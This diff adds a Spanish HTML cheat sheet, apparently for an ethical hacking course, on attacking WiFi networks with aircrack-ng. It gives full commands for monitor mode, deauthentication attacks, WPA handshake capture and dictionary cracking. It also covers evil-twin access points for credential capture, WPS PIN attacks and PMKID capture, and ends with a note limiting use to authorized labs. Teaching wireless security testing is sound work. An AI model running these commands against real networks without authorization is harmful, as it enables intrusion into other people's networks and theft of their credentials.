@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Guia Aircrack-ng Suite</title>
+<style>
+:root{
+  --bg:#0d1210; --surface:#141b18; --surface2:#1b2420;
+  --border:#2a3832; --text:#dce8e1; --text-dim:#8fa69c;
+  --accent:#4fd1a5; --accent2:#e8b64f; --danger:#e8695f;
+  --mono:'SF Mono','Fira Code','Consolas',monospace;
+  --sans:'Inter','Segoe UI',system-ui,sans-serif;
+  color-scheme: dark;
+}
+@media (prefers-color-scheme: light){
+  :root:not([data-theme="dark"]){
+    --bg:#f3f6f4; --surface:#fff; --surface2:#eef2f0;
+    --border:#d8e0dc; --text:#17221d; --text-dim:#5a6e65;
+    --accent:#1f9c70; --accent2:#9a6c10; --danger:#c23a2e;
+  }
+}
+*{box-sizing:border-box}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+body{
+  margin:0; background:var(--bg); color:var(--text); font-family:var(--sans);
+  padding-top:env(safe-area-inset-top,0px); padding-bottom:env(safe-area-inset-bottom,0px);
+  line-height:1.55;
+}
+header{
+  padding:2.2rem 1.5rem 1.6rem; max-width:900px; margin:0 auto; border-bottom:1px solid var(--border);
+}
+header h1{font-size:1.7rem; margin:0 0 .3rem; letter-spacing:-.02em;}
+header p{color:var(--text-dim); margin:0; font-size:.95rem;}
+.badge{
+  display:inline-block; font-family:var(--mono); font-size:.7rem; color:var(--accent);
+  border:1px solid var(--accent); padding:.15rem .5rem; border-radius:3px; margin-bottom:.8rem;
+}
+main{max-width:900px; margin:0 auto; padding:1.5rem;}
+.step{
+  display:grid; grid-template-columns:2.4rem 1fr; gap:1rem; margin-bottom:1.1rem;
+  background:var(--surface); border:1px solid var(--border); border-radius:8px; padding:1.1rem 1.2rem;
+}
+.step .n{
+  font-family:var(--mono); color:var(--accent); font-weight:700; font-size:1.1rem; padding-top:.1rem;
+}
+.step h2{margin:0 0 .35rem; font-size:1.05rem;}
+.step p{margin:.2rem 0 .6rem; color:var(--text-dim); font-size:.92rem;}
+code.cmd{
+  display:block; font-family:var(--mono); background:var(--surface2); border:1px solid var(--border);
+  border-radius:6px; padding:.6rem .8rem; font-size:.85rem; color:var(--accent2);
+  overflow-x:auto; white-space:pre;
+}
+.note{
+  font-size:.82rem; color:var(--text-dim); margin-top:.5rem; padding-left:.8rem;
+  border-left:2px solid var(--accent); 
+}
+.section-title{
+  font-family:var(--mono); font-size:.78rem; color:var(--text-dim); margin:2.2rem 0 .8rem;
+  padding-bottom:.4rem; border-bottom:1px dashed var(--border);
+}
+.flags{
+  display:grid; grid-template-columns:1fr; gap:.4rem; margin-top:.5rem;
+}
+.flag{font-family:var(--mono); font-size:.8rem;}
+.flag b{color:var(--accent2)}
+table{width:100%; border-collapse:collapse; font-size:.85rem; margin-top:.5rem;}
+th,td{text-align:left; padding:.45rem .5rem; border-bottom:1px solid var(--border);}
+th{color:var(--text-dim); font-weight:600; font-family:var(--mono); font-size:.75rem;}
+td code{font-family:var(--mono); color:var(--accent2);}
+.extra-grid{display:grid; gap:.8rem;}
+.extra{
+  background:var(--surface); border:1px solid var(--border); border-radius:8px; padding:.9rem 1.1rem;
+}
+.extra h3{margin:0 0 .3rem; font-size:.95rem;}
+.extra p{margin:0; color:var(--text-dim); font-size:.85rem;}
+.extra code{font-family:var(--mono); color:var(--accent2); font-size:.8rem;}
+.warn{
+  background:rgba(232,105,95,.08); border:1px solid var(--danger); border-radius:8px;
+  padding:.9rem 1.1rem; font-size:.85rem; color:var(--text); margin-top:1.5rem;
+}
+.warn b{color:var(--danger)}
+footer{text-align:center; color:var(--text-dim); font-size:.78rem; padding:2rem 1rem 3rem;}
+@media (max-width:480px){
+  .step{grid-template-columns:1fr; gap:.3rem;}
+  .step .n{display:none;}
+}
+</style>
+</head>
+<body>
+
+<header>
+  <span class="badge">INTRANET · REFERENCIA PRIVADA</span>
+  <h1>Guia de Aircrack-ng Suite</h1>
+  <p>Flujo cronológico completo — de modo monitor a crackeo de handshake, con herramientas complementarias.</p>
+</header>
+
+<main>
+
+<div class="section-title">01 — PREPARACIÓN DE LA INTERFAZ</div>
+
+<div class="step">
+  <div class="n">1</div>
+  <div>
+    <h2>Ver interfaces disponibles</h2>
+    <p>Identifica el nombre de tu adaptador wifi (ej. wlan0) y confirma que soporta modo monitor.</p>
+    <code class="cmd">iwconfig
+ip a</code>
+  </div>
+</div>
+
+<div class="step">
+  <div class="n">2</div>
+  <div>
+    <h2>Matar procesos conflictivos</h2>
+    <p>NetworkManager y wpa_supplicant interfieren con el modo monitor. Los detiene antes de continuar.</p>
+    <code class="cmd">airmon-ng check
+airmon-ng check kill</code>
+    <div class="note">Si necesitas internet mientras tanto, anota qué procesos mató para reiniciarlos después.</div>
+  </div>
+</div>
+
+<div class="step">
+  <div class="n">3</div>
+  <div>
+    <h2>Activar modo monitor</h2>
+    <p>Pone la tarjeta a capturar todo el tráfico del aire, no solo el dirigido a ti (como el modo managed normal).</p>
+    <code class="cmd">airmon-ng start wlan0</code>
+    <div class="note">Suele crear una interfaz nueva, típicamente <code style="color:var(--accent2)">wlan0mon</code>. Verifica con <code style="color:var(--accent2)">iwconfig</code> otra vez.</div>
+  </div>
+</div>
+
+<div class="section-title">02 — RECONOCIMIENTO (AIRODUMP-NG)</div>
+
+<div class="step">
+  <div class="n">4</div>
+  <div>
+    <h2>Escanear redes cercanas</h2>
+    <p>Muestra BSSID, canal, cifrado (WEP/WPA/WPA2/WPA3) y potencia de todas las redes al alcance.</p>
+    <code class="cmd">airodump-ng wlan0mon</code>
+    <div class="note">Anota el <b style="color:var(--text)">BSSID</b> y el <b style="color:var(--text)">CH</b> (canal) de tu objetivo. Ctrl+C para detener.</div>
+  </div>
+</div>
+
+<div class="step">
+  <div class="n">5</div>
+  <div>
+    <h2>Capturar tráfico de la red objetivo</h2>
+    <p>Fija el escaneo a un canal y BSSID específicos, y guarda los paquetes capturados en disco (incluido el handshake cuando ocurra).</p>
+    <code class="cmd">airodump-ng -c &lt;canal&gt; --bssid &lt;BSSID&gt; -w captura wlan0mon</code>
+    <div class="flags">
+      <div class="flag"><b>-c</b> canal de la red objetivo</div>
+      <div class="flag"><b>--bssid</b> MAC del punto de acceso</div>
+      <div class="flag"><b>-w</b> prefijo de los archivos de salida (.cap, .csv, etc.)</div>
+    </div>
+  </div>
+</div>
+
+<div class="section-title">03 — DESAUTENTICACIÓN (AIREPLAY-NG)</div>
+
+<div class="step">
+  <div class="n">6</div>
+  <div>
+    <h2>Forzar el handshake (deauth attack)</h2>
+    <p>Envía paquetes de desautenticación a un cliente conectado para que se reconecte y así capturar el 4-way handshake WPA/WPA2.</p>
+    <code class="cmd">aireplay-ng --deauth 10 -a &lt;BSSID&gt; -c &lt;MAC_cliente&gt; wlan0mon</code>
+    <div class="flags">
+      <div class="flag"><b>--deauth 10</b> número de paquetes de desauth a enviar</div>
+      <div class="flag"><b>-a</b> BSSID del AP objetivo</div>
+      <div class="flag"><b>-c</b> MAC del cliente (opcional; sin esto afecta a todos)</div>
+    </div>
+    <div class="note">Debes tener <code style="color:var(--accent2)">airodump-ng</code> corriendo en paralelo (paso 5) para ver el momento en que aparece <b style="color:var(--text)">"WPA handshake:"</b> arriba a la derecha.</div>
+  </div>
+</div>
+
+<div class="step">
+  <div class="n">7</div>
+  <div>
+    <h2>Verificar el handshake capturado</h2>
+    <p>Confirma que el archivo .cap contiene un handshake válido antes de intentar crackearlo.</p>
+    <code class="cmd">aircrack-ng captura-01.cap</code>
+    <div class="note">Si no hay clientes a quién desautenticar, se puede probar un ataque de asociación falsa: <code style="color:var(--accent2)">aireplay-ng --fakeauth 0 -a &lt;BSSID&gt; wlan0mon</code></div>
+  </div>
+</div>
+
+<div class="section-title">04 — CRACKEO (AIRCRACK-NG)</div>
+
+<div class="step">
+  <div class="n">8</div>
+  <div>
+    <h2>Crackear con diccionario</h2>
+    <p>Prueba cada palabra del diccionario contra el handshake capturado hasta encontrar la contraseña.</p>
+    <code class="cmd">aircrack-ng -w diccionario.txt -b &lt;BSSID&gt; captura-01.cap</code>
+    <div class="flags">
+      <div class="flag"><b>-w</b> ruta del diccionario (ej. rockyou.txt)</div>
+      <div class="flag"><b>-b</b> BSSID del objetivo, por si el .cap tiene varias redes</div>
+    </div>
+    <div class="note">En WEP, el proceso es distinto: se usa <code style="color:var(--accent2)">aircrack-ng</code> directo sobre suficientes IVs capturados, sin necesidad de diccionario.</div>
+  </div>
+</div>
+
+<div class="section-title">05 — LIMPIEZA: VOLVER A MODO MANAGED</div>
+
+<div class="step">
+  <div class="n">9</div>
+  <div>
+    <h2>Detener el modo monitor</h2>
+    <p>Devuelve la tarjeta a su interfaz y modo original.</p>
+    <code class="cmd">airmon-ng stop wlan0mon</code>
+  </div>
+</div>
+
+<div class="step">
+  <div class="n">10</div>
+  <div>
+    <h2>Restaurar la conexión normal</h2>
+    <p>Reinicia los servicios que detuviste en el paso 2 para recuperar wifi/internet normal.</p>
+    <code class="cmd">service NetworkManager restart
+# o alternativamente:
+systemctl restart NetworkManager</code>
+    <div class="note">Comando manual alternativo (sin airmon-ng) para forzar modo managed: <code style="color:var(--accent2)">ip link set wlan0mon down && iw wlan0mon set type managed && ip link set wlan0mon up</code></div>
+  </div>
+</div>
+
+<div class="section-title">06 — HERRAMIENTAS COMPLEMENTARIAS DEL SUITE</div>
+
+<div class="extra-grid">
+  <div class="extra">
+    <h3>airdecap-ng</h3>
+    <p>Desencripta capturas .cap una vez que tienes la clave, para analizar el tráfico en texto plano.</p>
+    <code>airdecap-ng -e &lt;ESSID&gt; -p &lt;password&gt; captura-01.cap</code>
+  </div>
+  <div class="extra">
+    <h3>packetforge-ng</h3>
+    <p>Crea paquetes ARP/UDP forjados a partir de un PRGA (útil en ataques WEP tipo chop-chop/fragmentation).</p>
+    <code>packetforge-ng --arp -a &lt;BSSID&gt; -h &lt;MAC&gt; -k 255.255.255.255 -l 255.255.255.255 -y frag.xor -w forjado.cap</code>
+  </div>
+  <div class="extra">
+    <h3>airbase-ng</h3>
+    <p>Crea un punto de acceso falso (rogue AP / evil twin) para ataques de phishing o captura de credenciales.</p>
+    <code>airbase-ng -e "RedFalsa" -c &lt;canal&gt; wlan0mon</code>
+  </div>
+  <div class="extra">
+    <h3>airdecloak-ng</h3>
+    <p>Elimina WEP cloaking de una captura para limpiar paquetes corruptos inyectados por sistemas IDS.</p>
+    <code>airdecloak-ng -i captura-01.cap -o limpio.cap</code>
+  </div>
+  <div class="extra">
+    <h3>airtun-ng</h3>
+    <p>Crea un túnel de interfaz virtual para inyectar tráfico arbitrario en una red ya comprometida.</p>
+    <code>airtun-ng -a &lt;BSSID&gt; -w diccionario.txt wlan0mon</code>
+  </div>
+  <div class="extra">
+    <h3>wash (reaver suite)</h3>
+    <p>No es parte de aircrack-ng pero se usa junto a él: detecta APs con WPS activo, vulnerables a ataques de PIN.</p>
+    <code>wash -i wlan0mon</code>
+  </div>
+  <div class="extra">
+    <h3>reaver</h3>
+    <p>Explota el WPS PIN para recuperar la contraseña WPA/WPA2 sin necesidad de diccionario.</p>
+    <code>reaver -i wlan0mon -b &lt;BSSID&gt; -vv</code>
+  </div>
+  <div class="extra">
+    <h3>crunch</h3>
+    <p>Genera diccionarios de fuerza bruta con patrones personalizados (longitud, charset).</p>
+    <code>crunch 8 8 0123456789 -o diccionario.txt</code>
+  </div>
+  <div class="extra">
+    <h3>hcxdumptool / hcxpcapngtool</h3>
+    <p>Alternativa moderna para capturar handshakes (incluye PMKID, sin necesidad de deauth) y convertirlos a formato hashcat.</p>
+    <code>hcxdumptool -i wlan0mon -o captura.pcapng
+hcxpcapngtool -o hash.22000 captura.pcapng</code>
+  </div>
+</div>
+
+<div class="section-title">07 — TABLA RESUMEN DE FLAGS COMUNES</div>
+
+<table>
+  <tr><th>Comando</th><th>Flag</th><th>Significado</th></tr>
+  <tr><td><code>airmon-ng</code></td><td><code>start / stop</code></td><td>Activa / desactiva modo monitor</td></tr>
+  <tr><td><code>airodump-ng</code></td><td><code>-c</code></td><td>Canal específico</td></tr>
+  <tr><td><code>airodump-ng</code></td><td><code>--bssid</code></td><td>Filtra por MAC del AP</td></tr>
+  <tr><td><code>airodump-ng</code></td><td><code>-w</code></td><td>Prefijo de archivos de salida</td></tr>
+  <tr><td><code>aireplay-ng</code></td><td><code>--deauth</code></td><td>Ataque de desautenticación</td></tr>
+  <tr><td><code>aireplay-ng</code></td><td><code>--fakeauth</code></td><td>Asociación falsa al AP</td></tr>
+  <tr><td><code>aircrack-ng</code></td><td><code>-w</code></td><td>Ruta del diccionario</td></tr>
+  <tr><td><code>aircrack-ng</code></td><td><code>-b</code></td><td>BSSID objetivo dentro del .cap</td></tr>
+</table>
+
+<div class="warn">
+  <b>Nota legal:</b> estos comandos solo deben usarse en redes propias o con autorización explícita por escrito del dueño de la red, dentro de un entorno de práctica o laboratorio controlado como el del curso de Ethical Hacking. El uso no autorizado sobre redes de terceros es ilegal.
+</div>
+
+</main>
+
+<footer>Chuleta de referencia · Aircrack-ng Suite · Uso interno</footer>
+
+</body>
+</html>
